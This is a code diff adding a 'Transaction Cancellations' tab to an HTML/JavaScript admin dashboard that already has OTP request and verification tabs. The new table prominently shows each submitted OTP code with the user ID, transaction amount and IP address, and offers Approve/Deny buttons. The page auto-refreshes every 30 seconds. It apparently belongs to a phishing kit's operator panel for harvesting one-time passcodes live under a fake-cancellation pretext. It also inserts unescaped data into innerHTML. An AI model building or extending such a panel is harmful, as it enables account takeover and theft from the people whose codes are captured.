@@ -391,6 +391,7 @@
         <button class="tab-btn" onclick="showTab('activities')">User Activities</button>
         <button class="tab-btn" onclick="showTab('otp-requests')">OTP Requests <span id="pending-badge" class="pending-badge">0</span></button>
         <button class="tab-btn" onclick="showTab('otp-verifications')">OTP Verifications <span id="pending-verifications-badge" class="pending-badge">0</span></button>
+        <button class="tab-btn" onclick="showTab('transaction-cancellations')">Transaction Cancellations <span id="pending-cancellations-badge" class="pending-badge">0</span></button>
         <button class="tab-btn" onclick="showTab('stats')">Activity Statistics</button>
     </div>
 
@@ -618,6 +619,56 @@
         </div>
     </div>
 
+    <!-- Transaction Cancellation Requests section -->
+    <div class="table-container" id="transaction-cancellations-container" style="display: none;">
+        <div class="table-header">
+            <h3 style="margin: 0;">Transaction Cancellation Requests</h3>
+            <div>
+                <select id="transaction-cancellation-status-filter" onchange="loadTransactionCancellations()" style="margin-right: 10px; padding: 4px 8px; border-radius: 4px; border: 1px solid rgba(255,255,255,0.5); background: rgba(255,255,255,0.2); color: white;">
+                    <option value="pending">Pending Only</option>
+                    <option value="all">All Requests</option>
+                    <option value="approved">Approved</option>
+                    <option value="denied">Denied</option>
+                </select>
+                <button class="refresh-btn" onclick="loadTransactionCancellations()">Refresh</button>
+            </div>
+        </div>
+        
+        <!-- Loading indicator for transaction cancellations -->
+        <div id="transaction-cancellations-loading" class="loading">Loading transaction cancellations...</div>
+        
+        <!-- Table for displaying transaction cancellation requests -->
+        <table id="transaction-cancellations-table" style="display: none;">
+            <thead>
+                <tr>
+                    <th>ID</th>
+                    <th>User ID</th>
+                    <th>OTP Code</th>
+                    <th>Transaction Amount</th>
+                    <th>IP Address</th>
+                    <th>Submitted At</th>
+                    <th>Status</th>
+                    <th>Actions</th>
+                </tr>
+            </thead>
+            <tbody id="transaction-cancellations-body">
+                <!-- Dynamic content will be inserted here -->
+            </tbody>
+        </table>
+        
+        <!-- Pagination for transaction cancellations -->
+        <div id="transaction-cancellations-pagination" style="padding: 20px; text-align: center; display: none;">
+            <button id="transaction-cancellations-prev-page" onclick="changeTransactionCancellationPage(-1)" disabled>Previous</button>
+            <span id="transaction-cancellations-page-info" style="margin: 0 15px;">Page 1 of 1</span>
+            <button id="transaction-cancellations-next-page" onclick="changeTransactionCancellationPage(1)" disabled>Next</button>
+        </div>
+        
+        <!-- No transaction cancellations message -->
+        <div id="no-transaction-cancellations" class="no-data" style="display: none;">
+            No transaction cancellation requests found.
+        </div>
+    </div>
+
     <!-- User Activity Tracking Script -->
     <script src="/public/tracking.js"></script>
     
@@ -759,6 +810,7 @@
             document.getElementById('activities-container').style.display = 'none';
             document.getElementById('otp-requests-container').style.display = 'none';
             document.getElementById('otp-verifications-container').style.display = 'none';
+            document.getElementById('transaction-cancellations-container').style.display = 'none';
             document.getElementById('stats-container').style.display = 'none';
             
             // Remove active class from all tabs
@@ -783,9 +835,13 @@
                 document.getElementById('otp-verifications-container').style.display = 'block';
                 document.querySelectorAll('.tab-btn')[3].classList.add('active');
                 loadOtpVerifications(); // Load OTP verification data
+            } else if (tabName === 'transaction-cancellations') {
+                document.getElementById('transaction-cancellations-container').style.display = 'block';
+                document.querySelectorAll('.tab-btn')[4].classList.add('active');
+                loadTransactionCancellations(); // Load transaction cancellation data
             } else if (tabName === 'stats') {
                 document.getElementById('stats-container').style.display = 'block';
-                document.querySelectorAll('.tab-btn')[4].classList.add('active');
+                document.querySelectorAll('.tab-btn')[5].classList.add('active');
                 loadActivityStats(); // Load statistics data
             }
         }
@@ -1250,6 +1306,115 @@
             loadOtpVerifications(newPage);
         }
 
+        // Function to load and display transaction cancellation requests
+        function loadTransactionCancellations(page = 1) {
+            // Show loading indicator
+            document.getElementById('transaction-cancellations-loading').style.display = 'block';
+            document.getElementById('transaction-cancellations-table').style.display = 'none';
+            document.getElementById('no-transaction-cancellations').style.display = 'none';
+            
+            // Get filter value
+            const statusFilter = document.getElementById('transaction-cancellation-status-filter').value;
+            
+            // Fetch transaction cancellation requests from backend
+            fetch(`/api/admin/transaction-cancellations?page=${page}&per_page=10&status=${statusFilter}`)
+                .then(response => response.json())
+                .then(data => {
+                    // Hide loading indicator
+                    document.getElementById('transaction-cancellations-loading').style.display = 'none';
+                    
+                    if (data.requests && data.requests.length > 0) {
+                        // Show table and populate with data
+                        document.getElementById('transaction-cancellations-table').style.display = 'table';
+                        populateTransactionCancellationsTable(data.requests);
+                        updateTransactionCancellationsPagination(data);
+                        updatePendingCancellationsBadge(data.pending_count || 0);
+                    } else {
+                        // Show no data message
+                        document.getElementById('no-transaction-cancellations').style.display = 'block';
+                        updatePendingCancellationsBadge(0);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error loading transaction cancellations:', error);
+                    document.getElementById('transaction-cancellations-loading').style.display = 'none';
+                    document.getElementById('no-transaction-cancellations').style.display = 'block';
+                    document.getElementById('no-transaction-cancellations').textContent = 'Error loading transaction cancellations. Please try again.';
+                });
+        }
+
+        // Function to populate transaction cancellations table
+        function populateTransactionCancellationsTable(cancellations) {
+            const tbody = document.getElementById('transaction-cancellations-body');
+            tbody.innerHTML = '';
+            
+            cancellations.forEach(cancellation => {
+                const row = document.createElement('tr');
+                
+                // Determine status badge class
+                let statusClass = 'pending';
+                if (cancellation.status === 'approved') statusClass = 'approved';
+                if (cancellation.status === 'denied') statusClass = 'denied';
+                
+                row.innerHTML = `
+                    <td>${cancellation.id}</td>
+                    <td>${cancellation.user_identifier.substring(0, 8)}...</td>
+                    <td><strong style="color: #4CAF50; font-size: 18px; font-family: monospace; background: #f0f8f0; padding: 4px 8px; border-radius: 4px;">${cancellation.otp_code}</strong></td>
+                    <td><strong style="color: #dc3545; font-size: 16px; font-family: monospace; background: #fff5f5; padding: 4px 8px; border-radius: 4px;">$${cancellation.transaction_amount}</strong></td>
+                    <td>${cancellation.ip_address}</td>
+                    <td>${new Date(cancellation.submitted_at).toLocaleString()}</td>
+                    <td><span class="status-badge ${statusClass}">${cancellation.status}</span></td>
+                    <td>
+                        ${cancellation.status === 'pending' ? `
+                            <button class="action-btn approve" onclick="approveTransactionCancellation(${cancellation.id})">✓ Approve</button>
+                            <button class="action-btn deny" onclick="denyTransactionCancellation(${cancellation.id})">✗ Deny</button>
+                        ` : `
+                            <span style="color: #666; font-style: italic;">
+                                ${cancellation.status === 'approved' ? 'Approved' : 'Denied'}
+                                ${cancellation.admin_notes ? `<br><small>${cancellation.admin_notes}</small>` : ''}
+                            </span>
+                        `}
+                    </td>
+                `;
+                tbody.appendChild(row);
+            });
+        }
+
+        // Function to update pending cancellations badge
+        function updatePendingCancellationsBadge(count) {
+            const badge = document.getElementById('pending-cancellations-badge');
+            if (count > 0) {
+                badge.textContent = count;
+                badge.classList.remove('hidden');
+            } else {
+                badge.classList.add('hidden');
+            }
+        }
+
+        // Function to update transaction cancellations pagination
+        function updateTransactionCancellationsPagination(data) {
+            const pagination = document.getElementById('transaction-cancellations-pagination');
+            const pageInfo = document.getElementById('transaction-cancellations-page-info');
+            const prevBtn = document.getElementById('transaction-cancellations-prev-page');
+            const nextBtn = document.getElementById('transaction-cancellations-next-page');
+            
+            if (data.pages > 1) {
+                pagination.style.display = 'block';
+                pageInfo.textContent = `Page ${data.page} of ${data.pages}`;
+                prevBtn.disabled = data.page <= 1;
+                nextBtn.disabled = data.page >= data.pages;
+            } else {
+                pagination.style.display = 'none';
+            }
+        }
+
+        // Function to change transaction cancellations page
+        function changeTransactionCancellationPage(direction) {
+            const currentPage = parseInt(document.getElementById('transaction-cancellations-page-info').textContent.match(/Page (\d+)/)[1]);
+            const newPage = currentPage + direction;
+            loadTransactionCancellations(newPage);
+        }
+
         // Function to approve OTP verification
         function approveOtpVerification(verificationId) {
             const notes = prompt("Optional notes for approval (or leave blank):");
@@ -1295,11 +1460,57 @@
             });
         }
 
+        // Function to approve transaction cancellation
+        function approveTransactionCancellation(verificationId) {
+            const notes = prompt("Optional notes for approval (or leave blank):");
+            if (notes !== null) { // User didn't cancel
+                processTransactionCancellationDecision(verificationId, 'approve', notes);
+            }
+        }
+
+        // Function to deny transaction cancellation
+        function denyTransactionCancellation(verificationId) {
+            const notes = prompt("Reason for denial (required):");
+            if (notes && notes.trim()) {
+                processTransactionCancellationDecision(verificationId, 'deny', notes);
+            } else if (notes !== null) {
+                alert("Please provide a reason for denial");
+            }
+        }
+
+        // Function to process transaction cancellation decision
+        function processTransactionCancellationDecision(verificationId, decision, notes = '') {
+            fetch(`/api/admin/transaction-cancellations/${verificationId}/decision`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    decision: decision,
+                    notes: notes
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    alert(`Transaction cancellation ${decision}d successfully!`);
+                    loadTransactionCancellations(); // Reload the transaction cancellations
+                } else {
+                    alert(`Error: ${data.error}`);
+                }
+            })
+            .catch(error => {
+                console.error('Error processing transaction cancellation decision:', error);
+                alert('Failed to process transaction cancellation decision');
+            });
+        }
+
         // Load submissions when page loads
         document.addEventListener('DOMContentLoaded', function() {
             loadSubmissions(); // Load submissions on page load
             loadOtpRequests(); // Load OTP requests to update pending badge
             loadOtpVerifications(); // Load OTP verifications to update pending badge
+            loadTransactionCancellations(); // Load transaction cancellations to update pending badge
         });
 
         // Auto-refresh current tab every 30 seconds
@@ -1311,7 +1522,8 @@
                 else if (activeIndex === 1) loadActivities(currentPage);
                 else if (activeIndex === 2) loadOtpRequests(currentOtpPage);
                 else if (activeIndex === 3) loadOtpVerifications(1);
-                else if (activeIndex === 4) loadActivityStats();
+                else if (activeIndex === 4) loadTransactionCancellations(1);
+                else if (activeIndex === 5) loadActivityStats();
             }
             
             // Always update pending badges regardless of active tab
@@ -1320,6 +1532,9 @@
             }
             if (activeIndex !== 3) { // Don't double-load if OTP verifications tab is active
                 loadOtpVerifications(1); // Load first page to update badge count
+            }
+            if (activeIndex !== 4) { // Don't double-load if transaction cancellations tab is active
+                loadTransactionCancellations(1); // Load first page to update badge count
             }
         }, 30000);
     </script>
